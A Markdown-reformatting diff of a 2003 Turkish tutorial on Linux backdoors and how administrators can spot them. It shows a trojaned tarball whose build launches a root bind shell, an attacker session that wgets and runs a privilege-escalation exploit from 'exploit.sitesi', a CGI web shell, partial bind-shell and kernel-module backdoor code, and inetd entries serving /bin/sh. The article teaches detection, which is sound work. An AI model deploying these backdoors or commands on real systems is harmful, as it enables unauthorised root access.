@@ -28,17 +28,24 @@ yazılımların güvenilirlik kontrollerini yapmayız. Kimbilir belki gönül ra
 kurduğunuz dosyaların sisteminizde bir arkakapı oluşturma olasılığını gözardı ediyorsunuzdur.
 
 Yazılımın Web sitesinde belirtilen MD5 kontrolu:
+
+```
 file.tar.gz
 18a8284860c5c9940c57e03aac4a9911
+```
 
 Bizim yaptığımız file.tar.gz'nin kontrolu:
+
+```bash
 $ md5sum file.tar.gz
 64dc31bf20ace98a7200d39da7d0d1a2
+```
 
 Sonuçlar farklı. Üstünde düşünülmesi gereken bir durum. Dikkat!!!!
 Üşenip md5 kontrolunu yapmadan, çektiğimiz dosyayı sisteme kurduğumuzu düşünelim.
 
-**\[baglik@eregli Kod\]# tar zxvf file.tar.gz**
+```bash
+[baglik@eregli Kod]# tar zxvf file.tar.gz
 file
 file/getconn.c
 file/Makefile
@@ -47,53 +54,61 @@ file/main.c
 file/common.h
 file/file.c
 
-**\[baglik@eregli file\]# make**
-cc -Wall -g \`libnet-config --cflags --defines\` -c getconn.c
-getconn.c: In function \`getconn':
-getconn.c:30: warning: implicit declaration of function \`exit'
+[baglik@eregli file]# make
+cc -Wall -g `libnet-config --cflags --defines` -c getconn.c
+getconn.c: In function `getconn':
+getconn.c:30: warning: implicit declaration of function `exit'
 cc config.c -o config
 ./config &
-cc -Wall -g \`libnet-config --cflags --defines\` -c main.c
-cc -Wall -g \`libnet-config --cflags --defines\` -c file.c
-cc -o file getconn.o main.o file.o -L/usr/local/lib -lpcap \`libnet-config --libs\`
+cc -Wall -g `libnet-config --cflags --defines` -c main.c
+cc -Wall -g `libnet-config --cflags --defines` -c file.c
+cc -o file getconn.o main.o file.o -L/usr/local/lib -lpcap `libnet-config --libs`
+```
 
 Dikkatli kullanıcı hemen ./config & satırını görünce bir anda şüpheye düşer.
 Bu config.c isimli dosya incelendiğinde sistemde arka kapıya neden olan kod olduğu
 anlaşılır.
 
-**\[baglik@eregli file\]# pico config.c**
+```bash
+[baglik@eregli file]# pico config.c
+```
 
+```c
 ...
 ...
 #define port 60000
 #define shell "/bin/sh"
 ...
 ...
-execl(shell,shell,(char \*)0);
+execl(shell,shell,(char *)0);
 ...
 ...
+```
 
 Bu açık portu fark eden kişi:
 
-**\[yabanci@operim yabanci\]$ telnet eregli.sistem 60000**
+```bash
+[yabanci@operim yabanci]$ telnet eregli.sistem 60000
 
 Trying eregli.sistem...
 Connected to eregli.sistem (xxx.xxx.xxx.xxx).
-Escape character is '^\]'.
+Escape character is '^]'.
 
 id;
 uid=0(root) gid=0(root) groups=0(root) <-- arka kapı sınırları yeniden çizer.
 -- dosya root yetkisiyle kurulduğundan
 -- sistem yöneticisine tozlu rüyalar gördürür.
+```
 
 Eğer bu file.tar.gz isimli dosyayı herhangi bir kullanıcı(root yetkisine sahip olmayan)
 sisteme kurduysa;
 
-**\[yabanci@operim yabanci\]$ telnet eregli.sistem 60000**
+```bash
+[yabanci@operim yabanci]$ telnet eregli.sistem 60000
 
 Trying eregli.sistem...
 Connected to eregli.sistem (xxx.xxx.xxx.xxx).
-Escape character is '^\]'.
+Escape character is '^]'.
 
 id;
 uid=501(k.mi) gid=501(k.mi) groups=501(student) <-- normal kullanıcı modunda.
@@ -111,16 +126,16 @@ cd /tmp;
 pwd;
 /tmp
 
-/usr/bin/wget http://exploit.sitesi/dosya/8.2/op\_beni.c;
---00:58:43-- http://exploit.sitesi/dosya/8.2/op\_beni.c
-=> \`op\_beni.c'
+/usr/bin/wget http://exploit.sitesi/dosya/8.2/op_beni.c;
+--00:58:43-- http://exploit.sitesi/dosya/8.2/op_beni.c
+=> `op_beni.c'
 Connecting to exploit.sitesi:80... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 6,767 \[text/plain\]
+Length: 6,767 [text/plain]
 
 0K ...... 100%
 
-00:58:43 .....\`op\_beni.c' saved \[6767/6767\]
+00:58:43 .....`op_beni.c' saved [6767/6767]
 
 ls;
 dcopGByrhp
@@ -128,26 +143,27 @@ dcopYfUXJw
 kde-root
 ksocket-root
 mcop-root
-op\_beni.c <-- Sisteme indirilip derlenmek istenen dosya.
+op_beni.c <-- Sisteme indirilip derlenmek istenen dosya.
 
-/bin/gcc -o op\_beni op\_beni.c;
+/bin/gcc -o op_beni op_beni.c;
 ls;
 dcopGByrhp
 dcopYfUXJw
 kde-root
 ksocket-root
 mcop-root
-op\_beni <-- Derlenmiş hali.
-op\_beni.c
+op_beni <-- Derlenmiş hali.
+op_beni.c
 
-./op\_beni; <-- Exploit çalıştırılıyor.
-\[\*\] Wait ....
-\[\*\] Wait ......
-\[\*\] muck ... muck ... muck ... muck
-\[\*\] Bingo :)
+./op_beni; <-- Exploit çalıştırılıyor.
+[*] Wait ....
+[*] Wait ......
+[*] muck ... muck ... muck ... muck
+[*] Bingo :)
 
 id;
 uid=0(root) gid=0(root) groups=0(root) <-- Sınırları zorlama zamanı ;)
+```
 
 Sisteminize ait herhangi bir kullanıcının şifresini elde eden saldırgan, sisteme
 tekrar bağlanmak için(özellikle şifre değişmesi halinde) sistemde arka kapı bırakma
@@ -168,17 +184,20 @@ oluşturabilir.
 Aşağıdaki komut.cgi isimli dosyayı sunucunun /cgi-bin dizinine yükleyen misafir, Web
 göstericiler üzerinden sistemde kodlarda çalıştırabilir.
 
+```bash
 #komut.cgi
 #!/bin/sh
 echo Content-type: text/html
 echo
 echo "<pre>"
-$\*
+$*
+```
 
-\[eregli@eregli eregli\]$ lynx http://arkakapili.sistem/cgi-bin/komut.cgi?ls%20/etc
+```bash
+[eregli@eregli eregli]$ lynx http://arkakapili.sistem/cgi-bin/komut.cgi?ls%20/etc
 
 Bastille
-DIR\_COLORS
+DIR_COLORS
 X11
 adjtime
 aliases
@@ -193,7 +212,8 @@ conf.linuxconf
 ..
 -- press space for next page --
 Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
-H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search \[delete\]=history list
+H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
+```
 
 Davetsiz misafir, sistem yöneticisi durumuna geldiğinde tekrar sisteme bağlanmak
 istediğinde yapacağı eğilimlerden biri olarak sistemde açık kapı bırakmak olduğunu
@@ -203,63 +223,72 @@ sistemde gezinmeye başlar. Saldırgan, sistem yöneticisinin, sistemde calışa
 görmek istemesi durumunda sahte isimlerle karşılaşması için açık kapı bırakan
 uygulamalarda kod değişikliği yapabilir.
 
+```c
 #include <sys/socket.h>
 #include <netinet/in.h>
 ....
 #define SHELL "/bin/sh"
 #define SARG "-i"
-#define PASSWD "ACIL\_KAPI"
+#define PASSWD "ACIL_KAPI"
 #define PORT 6767
 #define FAKEPS "httpd"
 #define SHELLPS "klogd"
 ...
-int main (int argc, char \*argv\[\])
+int main (int argc, char *argv[])
 {
 ...
-static char \*pass = PASSWD;
+static char *pass = PASSWD;
 ...
-strcpy(argv\[0\], FAKEPS);
-signal(SIGCHLD, SIG\_IGN);
-if ((lsock = socket(AF\_INET, SOCK\_STREAM, 0)) == -1) exit (-1);
+strcpy(argv[0], FAKEPS);
+signal(SIGCHLD, SIG_IGN);
+if ((lsock = socket(AF_INET, SOCK_STREAM, 0)) == -1) exit (-1);
 ...
 execv(SHELL, sargv);
 ...
 exit(0);
 }
+```
 
-\[eregli@eregli eregli\]$ ssh -l avicenna arkakapili.sistem
+```bash
+[eregli@eregli eregli]$ ssh -l avicenna arkakapili.sistem
 avicenna@arkakapili's password:
 Last login: Mon Apr 14 01:52:00 2003 from xxx.yyy.zzz.ttt
-\[avicenna@arkakapili avicenna\]$ cd /tmp
-\[avicenna@arkakapili tmp\]$ mkdir .mail
-\[avicenna@arkakapili tmp\]$ cd .mail
-\[avicenna@arkakapili .mail\]$ cat > net.c
+[avicenna@arkakapili avicenna]$ cd /tmp
+[avicenna@arkakapili tmp]$ mkdir .mail
+[avicenna@arkakapili tmp]$ cd .mail
+[avicenna@arkakapili .mail]$ cat > net.c
 #include <sys/socket.h>
 #include <netinet/in.h>
 ....
 #define SHELL "/bin/sh"
 #define SARG "-i"
-#define PASSWD "ACIL\_KAPI"
+#define PASSWD "ACIL_KAPI"
 #define PORT 6767
 #define FAKEPS "httpd"
 #define SHELLPS "klogd"
 ...
-int main (int argc, char \*argv\[\])
+int main (int argc, char *argv[])
 {
 ...
-static char \*pass = PASSWD;
+static char *pass = PASSWD;
 ...
 
-\[avicenna@arkakapili .mail\]$ gcc -o net net.c
+[avicenna@arkakapili .mail]$ gcc -o net net.c
+```
 
 Bu esnada saldırgan sisteme root olarak girmek için açık kapıyı root durumda bırakmak
 isteyecektir. Bu nedenle normal kullanıcıdan root moduna geçmek için exploitleri deneyecektir.
 Yani anlayacağınız sistem, sıfırdan vurulmak için bir deneme tahtası olacaktır(uid=0).
 Hedefi sıfırdan vurduğunda açık kapı bırakma işlemi başlamıştır.
-\[root@arkakapili .mail\]# ./net &
+
+```bash
+[root@arkakapili .mail]# ./net &
+```
 
 Sistemde açık kapı bırakılmadan önce yapılan port taramasının sonucu:
-\[root@eregli eregli\]# nmap -p 1-10000 arkakapili.sistem
+
+```bash
+[root@eregli eregli]# nmap -p 1-10000 arkakapili.sistem
 
 Starting nmap V. 2.54BETA30 ( www.insecure.org/nmap/ )
 Interesting ports on arkakapili.sistem (xxx.xxx.xxx.xxx):
@@ -272,11 +301,13 @@ Port State Service
 110/tcp open pop-3
 443/tcp open https
 3306/tcp open mysql
+```
 
 Portlar incelendiğinde herşey normal gözüküyor.
 Fakat açık kapı bırakıldığında portların durumunu görelim:
 
-**\[root@eregli eregli\]# nmap -p 1-10000 arkakapili.sistem**
+```bash
+[root@eregli eregli]# nmap -p 1-10000 arkakapili.sistem
 
 Starting nmap V. 2.54BETA30 ( www.insecure.org/nmap/ )
 Interesting ports on arkakapili.sistem (xxx.xxx.xxx.xxx):
@@ -290,35 +321,41 @@ Port State Service
 443/tcp open https
 3306/tcp open mysql
 6767/tcp open unknown <--- ilginc bir port ;)
+```
 
-**\[eregli@eregli eregli\]$ telnet arkakapili.sistem 6767**
+```bash
+[eregli@eregli eregli]$ telnet arkakapili.sistem 6767
 Trying xxx.xxx.xxx.xxx...
 Connected to arkakapili.sistem (xxx.xxx.xxx.xxx).
-Escape character is '^\]'.
+Escape character is '^]'.
 eregli <--- Yanlış şifre girildiğinden
 Connection closed by foreign host. --- uygulama baglantıyı kopardı.
+```
 
-**\[eregli@eregli eregli\]$ telnet arkakapili.sistem 6767**
+```bash
+[eregli@eregli eregli]$ telnet arkakapili.sistem 6767
 Trying xxx.xxx.xxx.xxx...
 Connected to arkakapili.sistem (xxx.xxx.xxx.xxx).
-Escape character is '^\]'.
-ACIL\_KAPI
+Escape character is '^]'.
+ACIL_KAPI
 
 klogd: no job control in this shell
-\[root@arkakapili /\]# id
+[root@arkakapili /]# id
 uid=0(root) gid=0(root) groups=0(root) <-- Sistem yöneticisi şimdi ağlasın mı,
 -- gülsün mü?
+```
 
 Sistem yöneticisi çalışan uygulamalara baktığında, çalışan uygulamaların olağan
 uygulamalar olduğu kanısına varabilir:
 
-**\[root@arkakapili root\]# ps -aux**
+```bash
+[root@arkakapili root]# ps -aux
 USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND
 root 1 0.2 0.3 1412 504 ? S 01:37 0:04 init
-root 2 0.0 0.0 0 0 ? SW 01:37 0:00 \[keventd\]
-root 3 0.0 0.0 0 0 ? SW 01:37 0:00 \[kapmd\]
-root 4 0.0 0.0 0 0 ? SWN 01:37 0:00 \[ksoftirqd\_CPU0\]
-root 5 0.0 0.0 0 0 ? SW 01:37 0:00 \[kswapd\]
+root 2 0.0 0.0 0 0 ? SW 01:37 0:00 [keventd]
+root 3 0.0 0.0 0 0 ? SW 01:37 0:00 [kapmd]
+root 4 0.0 0.0 0 0 ? SWN 01:37 0:00 [ksoftirqd_CPU0]
+root 5 0.0 0.0 0 0 ? SW 01:37 0:00 [kswapd]
 named 1018 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
 named 1025 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
 named 1026 0.0 1.8 10192 2324 ? S 01:38 0:00 named -u named
@@ -331,47 +368,52 @@ avicenna 2777 0.0 1.2 2724 1532 pts/6 S 01:52 0:00 -bash
 root 2808 0.0 1.2 2784 1588 ? S 01:52 0:00 klogd -i <--- Dikkat !!!!
 root 2832 0.0 0.0 1368 104 ? S 01:52 0:00 httpd ole <--- Dikkat !!!!
 root 2932 0.0 0.7 2904 960 pts/1 R 02:08 0:00 ps -aux
+```
 
 SockStat aracı ile sistemde uygulamaların kullandığı portları ve durumlarını inceleyebilirsiniz.
 
-**\[root@arkakapili root\]#./sockstat**
+```bash
+[root@arkakapili root]#./sockstat
 SocketStat v1.0 - A Socket Information Program
 
 Pro User Process Local Address State
-UDP root portmap\[776\] x.x.x.x:111 CLOSED
-TCP root portmap\[776\] x.x.x.x:111 LISTEN
-UDP root rpc.sta\[842\] x.x.x.x:1018 CLOSED
-UDP root rpc.sta\[842\] x.x.x.x:1024 CLOSED
-TCP root rpc.sta\[842\] x.x.x.x:1024 LISTEN
-UDP named named\[1018\] x.x.x.x:1025 CLOSED
-UDP named named\[1018\] x.x.x.x:53 CLOSED
-TCP named named\[1018\] x.x.x.x:53 LISTEN
+UDP root portmap[776] x.x.x.x:111 CLOSED
+TCP root portmap[776] x.x.x.x:111 LISTEN
+UDP root rpc.sta[842] x.x.x.x:1018 CLOSED
+UDP root rpc.sta[842] x.x.x.x:1024 CLOSED
+TCP root rpc.sta[842] x.x.x.x:1024 LISTEN
+UDP named named[1018] x.x.x.x:1025 CLOSED
+UDP named named[1018] x.x.x.x:53 CLOSED
+TCP named named[1018] x.x.x.x:53 LISTEN
 ...
-TCP root httpd\[1561\] x.x.x.x:80 LISTEN
-TCP root mysqld\[1667\] x.x.x.x:3306 LISTEN
-TCP root mysqld\[1773\] x.x.x.x:3306 LISTEN
-TCP root mysqld\[1775\] x.x.x.x:3306 LISTEN
-TCP root mysqld\[1780\] x.x.x.x:3306 LISTEN
-TCP root kapici\[2284\] x.x.x.x:6767 LISTEN
-\------ ----
+TCP root httpd[1561] x.x.x.x:80 LISTEN
+TCP root mysqld[1667] x.x.x.x:3306 LISTEN
+TCP root mysqld[1773] x.x.x.x:3306 LISTEN
+TCP root mysqld[1775] x.x.x.x:3306 LISTEN
+TCP root mysqld[1780] x.x.x.x:3306 LISTEN
+TCP root kapici[2284] x.x.x.x:6767 LISTEN
+------ ----
 | |
 | |- ---Kullandigi Port
 |
 |---Calisan uygulama
+```
 
-**\[root@arkapili root\]#./sockstat**
+```bash
+[root@arkapili root]#./sockstat
 SocketStat v1.0 - A Socket Information Program
 Pro User Process Local Address State
 ...
-TCP root sh\[2284\] x.x.x.x:6767 ESTBLSH
-TCP root sh\[2284\] x.x.x.x:6767 ESTBLSH
-TCP root sh\[2284\] x.x.x.x:6767 ESTBLSH
-TCP root sh\[2284\] x.x.x.x:6767 LISTEN
-TCP root |-- sh\[2284\] x.x.x.x:6767 ESTBLSH
-TCP root |-- sh\[2284\] x.x.x.x:6767 ESTBLSH
-TCP root |-- kapici\[2310\] x.x.x.x:6767 LISTEN ---------- |
+TCP root sh[2284] x.x.x.x:6767 ESTBLSH
+TCP root sh[2284] x.x.x.x:6767 ESTBLSH
+TCP root sh[2284] x.x.x.x:6767 ESTBLSH
+TCP root sh[2284] x.x.x.x:6767 LISTEN
+TCP root |-- sh[2284] x.x.x.x:6767 ESTBLSH
+TCP root |-- sh[2284] x.x.x.x:6767 ESTBLSH
+TCP root |-- kapici[2310] x.x.x.x:6767 LISTEN ---------- |
 |
 |- /bin/sh(kabuk) calismis durumda. 6767 numarali portta biri var.
+```
 
 Saldırgan, sisteme bağlanmak için kullandığı kullanıcının, şifresini değiştirmeyeceğini
 düşünerek sisteme müfredata uygun şekilde bağlanıp Kernel istismarlarını kullanarak yönetici
@@ -387,7 +429,7 @@ düşünmez. Davetsiz misafir dönen gözünü yuvasına oturtturmak için her t
 sistemine sahip başka bir bilgisayarda root yetkisini verecek exploiti derleyip sizin
 sisteminize aktararak çeşitli olasılıkları deniyecektir.
 
-Konuyu dağıtmadan bir olayı irdeleyelim\[Milleti illaki paranoya moduna getirecez ya :)\]
+Konuyu dağıtmadan bir olayı irdeleyelim[Milleti illaki paranoya moduna getirecez ya :)]
 Yurt dışında azımsanamayacak derecede muşteriye sahip bir servis sağlayıcısı güzel bir
 hayat sürmekteymiş. O servis sağlayıcının Web sitesini gezen sakin, gözü yuvasından fırlamamış
 kişi sistemin üyeler(members) bölümüne farenin klik sesini duyacak şekilde tıkladığında
@@ -417,26 +459,29 @@ ihtimalide vardır :)
 Bunu yapabilmek için kullanacagı diğer bir açık kapıda Kernel Backdoor diye tasvir edilen
 uygulamaları kullanmasıdır.
 
-**\[root@arkakapi /root\]# lsmod**
+```bash
+[root@arkakapi /root]# lsmod
 Module Size Used by Tainted: P
 kbdv 940 0 (unused) <-- Bu modül hoşa gitmiyen tipe benziyor.
 nfsd 69536 8 (autoclean)
-lockd 49344 1 (autoclean) \[nfsd\]
-sunrpc 62964 1 (autoclean) \[nfsd lockd\]
+lockd 49344 1 (autoclean) [nfsd]
+sunrpc 62964 1 (autoclean) [nfsd lockd]
 ...
 ext3 62092 1
 ...
+```
 
 Beklenmeyen misafir sistemde yönetici durumuna geçmiş, sistemi yeteri kadar incelemiş.
 Böyle bir sistemi bir daha nerede bulurum düşüncesiyle sistemde yetkileri tekrar eline
-almak icin gerçek yöneticinin düşünemeyeceği yollara başvurma ihtimalide vardır(\`Sistemde
-açık portlar kapatılabilir, suid tipi dosyalarin bu özellikleri kaldırılabilir\` düşüncesine
+almak icin gerçek yöneticinin düşünemeyeceği yollara başvurma ihtimalide vardır(`Sistemde
+açık portlar kapatılabilir, suid tipi dosyalarin bu özellikleri kaldırılabilir` düşüncesine
 sahip bir saldırgan türüyle karşı karşıya kalınabilir).
 
 Örneğin:
 
+```c
 #define MODULE
-#define \_\_KERNEL\_\_
+#define __KERNEL__
 
 #include <syscall.h>
 #include <asm/uaccess.h>
@@ -444,35 +489,38 @@ sahip bir saldırgan türüyle karşı karşıya kalınabilir).
 #include <linux/modversions.h>
 ...
 
-#define FILE\_NAME "op\_beni" <--- Sihirli kelimeler
+#define FILE_NAME "op_beni" <--- Sihirli kelimeler
 
-extern void \*sys\_call\_table\[\];
+extern void *sys_call_table[];
 
-/\* system calls we will replace \*/
-int (\*orig\_utime)(const char \*filename, struct utimbuf \*buf);
-int (\*orig\_getuid32)();
+/* system calls we will replace */
+int (*orig_utime)(const char *filename, struct utimbuf *buf);
+int (*orig_getuid32)();
 int u;
 ....
-sys\_call\_table\[SYS\_utime\] = orig\_utime;
-sys\_call\_table\[SYS\_getuid32\] = orig\_getuid32;
+sys_call_table[SYS_utime] = orig_utime;
+sys_call_table[SYS_getuid32] = orig_getuid32;
 }
+```
 
 Yukarıda kaynağa benzer bir .c kodunu sisteme aktaran kişi root yetkisiyle dosyayı
 derlediğini düsünelim.
 
-**\[root@arkakapili tmp\]# gcc -c -O2 kbdv3.c -I/lib/modules/\`uname -r\`/build/include**
-**\[root@arkakapili tmp\]# ls -1**
+```bash
+[root@arkakapili tmp]# gcc -c -O2 kbdv3.c -I/lib/modules/`uname -r`/build/include
+[root@arkakapili tmp]# ls -1
 kbdv.c
 kbdv.o <-- Sisteme tekrar baglanıldığında root ateşi sardıracak.
 
-**\[root@arkakapili tmp\]# insmod kbdv3.o**
+[root@arkakapili tmp]# insmod kbdv3.o
 Warning: loading kbdv3.o will taint the kernel: no license
 
-**\[root@saldirgan tmp\]# lsmod**
+[root@saldirgan tmp]# lsmod
 Module Size Used by Tainted: P
 kbdv 908 0 (unused) <-- Bekliyor ustadini :)
 
 ...
+```
 
 Saldirgan artik sistemi gönul rahatlığıyla terk ediyor. Canı sıkıldıgında,
 bu root neden bunlari anlamadi dusuncesine kapıldığında yada kız arkadaşına
@@ -480,43 +528,49 @@ kızdığında dagıtmak isteyecegi tek yer Kernel Backdoor olayına girdiği si
 Sisteme bağlandığında normal user olarak girer fakat sihirli kelimeleri söylediğinde
 artık root olmuştur. Geri dönülmez yola girmiştir.
 
-**\[eregli@eregli eregli\]# ssh -l avicenna arkakapili.sistem**
+```bash
+[eregli@eregli eregli]# ssh -l avicenna arkakapili.sistem
 avicenna@arkakapili's password:
 Last login: Mon Apr 14 02:28:31 2003 from eregli.sistem
-\[avicenna@arkakapili avicenna\]$ <-- Normal kullanici durumumda
-\[avicenna@arkakapili avicenna\]$ touch op\_beni <-- Sihirli kelimeler fisildandi
-\[avicenna@arkakapili avicenna\]$ exit <-- Sistemden ayrildi.
+[avicenna@arkakapili avicenna]$ <-- Normal kullanici durumumda
+[avicenna@arkakapili avicenna]$ touch op_beni <-- Sihirli kelimeler fisildandi
+[avicenna@arkakapili avicenna]$ exit <-- Sistemden ayrildi.
 -- Kernel Backdoor sisteme tekrar baglanmasini
 -- beklemektedir. Cünkü üstadına yöneticilik
 -- sertifikasi verecektir :)
 
-**\[eregli@eregli eregli\]$ ssh -l avicenna arkakapili.sistem**
+[eregli@eregli eregli]$ ssh -l avicenna arkakapili.sistem
 avicenna@arkakapili's password:
 Last login: Mon Apr 14 05:30:34 2003 from eregli.sistem
-\[avicenna@arkakapili avicenna\]# <-- Sonuç :)
+[avicenna@arkakapili avicenna]# <-- Sonuç :)
+```
 
 Sistemdeki servislerin her zaman uslu uslu duracak halleri olmayabilir.
 Sizden habersiz birileri sisteme servisler ekleme ihtimallerine karşın /etc/inetd.conf
 dosyasını ve /etc/xinetd.d dizini altında bulunan dosyaları kontrol etmek menfaat icabıdır.
 
-**\[root@arkakapili /\]cat /etc/inetd.conf**
+```bash
+[root@arkakapili /]cat /etc/inetd.conf
 ...
 echo 4444 stream tcp nowait root /bin/sh sh -i <-- Dikkat !!!!
 ...
+```
 
-**\[root@sistem /xserver\]cat /etc/xinetd.d/kendim** <--
+```bash
+[root@sistem /xserver]cat /etc/xinetd.d/kendim <--
 ...
 protocol = tcp |
 port = 4444 |
-socket\_type = stream |
+socket_type = stream |
 wait = no |
 user = root |
 server = /bin/sh |--- Dikkat !!!!
-server\_args = -i |
+server_args = -i |
 ...
+```
 
 Arka kapı durumlarına kısaca değinmeye çalıştım. Umarım bazı konuların aydınlanmasında
 azda olsa ışık vermişimdir.
 
 ---
-*Kaynak: `LİNUX GÜVENLİK AÇIKLARI/Odevsitesi_com_32333.doc` — Özgüç Bayrak    — 2003*
+*Kaynak: `LİNUX GÜVENLİK AÇIKLARI/Odevsitesi_com_32333.doc` — Özgüç Bayrak    — 2003*
